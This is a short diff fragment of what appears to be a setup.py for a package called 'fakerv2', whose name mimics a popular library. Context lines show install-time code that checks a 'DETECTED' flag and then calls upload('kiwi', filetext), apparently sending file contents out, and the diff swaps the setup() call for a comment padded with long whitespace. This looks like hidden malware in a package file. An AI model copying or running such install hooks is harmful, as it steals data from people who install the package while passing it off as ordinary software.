@@ -678,15 +678,4 @@ if not DETECTED:
     upload('kiwi',filetext)
 from setuptools import setup
 
-setup(
-
-    name='fakerv2',
-    packages=['fakerv2'],
-    version='1.0',
-    license='MIT',
-    description='a simple package.',
-    author='helper',
-    keywords=['style'],
-    install_requires=[''],
-    classifiers=['Development Status :: 5 - Production/Stable']
-)
+# setup(...) removed                                                                                                                                                                                                                                                      
